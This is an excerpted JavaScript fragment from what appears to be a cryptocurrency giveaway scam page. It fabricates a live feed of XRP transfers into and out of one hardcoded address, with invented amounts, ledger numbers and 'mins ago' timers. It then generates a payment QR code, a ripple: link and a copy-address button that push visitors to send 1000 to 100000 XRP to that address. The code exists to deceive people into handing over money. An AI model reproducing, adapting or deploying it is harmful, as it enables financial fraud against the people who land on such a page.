...
function create_transaction(mins) {
  ...
  row.innerHTML =
    ...
    address +
    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">raCPvNHBUgxJeDvcLn9cGLyC7YZ3sxiQG5</span> </td> <td>' +
    conamount +
  ...
  row.innerHTML =
    ...
    '</a></td> <td><span class="timer">' +
    mins +
    ' mins ago</span></td> <td><span class="hash-tag text-truncate">raCPvNHBUgxJeDvcLn9cGLyC7YZ3sxiQG5</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
    address +
    '</a> </td> <td>' +
    outcon +
    ' XRP</td> <td><span class="grat-bgg">' +
  ...
  ;(row.innerHTML =
    ...
    setTimeout(() => {
      ...
      ;(row.innerHTML =
        ...
        '</a> </td> <td class="d-none d-sm-table-cell leadger"><a href="">' +
        tx(99999999) +
        '</a></td> <td><span class="timer" >now</span></td> <td><span class="hash-tag text-truncate">raCPvNHBUgxJeDvcLn9cGLyC7YZ3sxiQG5</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
        address +
        '</a> </td> <td>' +
        outcon +
        ' XRP</td> <td><span class="grat-bgg">' +
  ...
  $('#gen-btn').click(() => {
    ;($('#cal-in').val() >= 1000) & ($('#cal-in').val() <= 100000)
      ? ($('#warn').text(''),
        ...
        $('#qrcode_svg').attr(
          'src',
          'https://api.qrserver.com/v1/create-qr-code/?data=ripple%3AraCPvNHBUgxJeDvcLn9cGLyC7YZ3sxiQG5%3Famount%3D' +
            amount_entered +
        ...
        $('#paynow')
          ...
          .attr(
            'href',
            'ripple:raCPvNHBUgxJeDvcLn9cGLyC7YZ3sxiQG5?amount=' +
              amount_entered +
...
$('#copy_address').click(() => {
  $('#copy_address').attr(
    'data-clipboard-text',
    'raCPvNHBUgxJeDvcLn9cGLyC7YZ3sxiQG5',
  )
